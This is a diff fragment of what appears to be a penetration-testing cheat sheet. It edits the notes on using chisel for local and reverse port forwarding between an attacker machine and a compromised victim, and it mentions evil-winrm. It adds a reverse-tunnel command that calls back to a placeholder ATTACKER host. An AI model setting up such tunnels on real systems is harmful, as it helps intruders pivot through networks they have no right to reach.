@@ -210,8 +210,9 @@ Match junkuser
   - victim to our machine: ./chisel server -p 1337 --reverse &
   
 - Local Port Forward
-  - compromised: ./chisel server -p LISTEN_PORT
-  - attacker: ./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
+  - attacker: ./chisel server -p LISTEN_PORT
+  - Victim: ./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
+    - Victim: chisel client ATTACKER:PORT R:LOCALPORT:localhost:TargetPORT 
 
 - In the machine with evil-win open firewall port
   - cd w
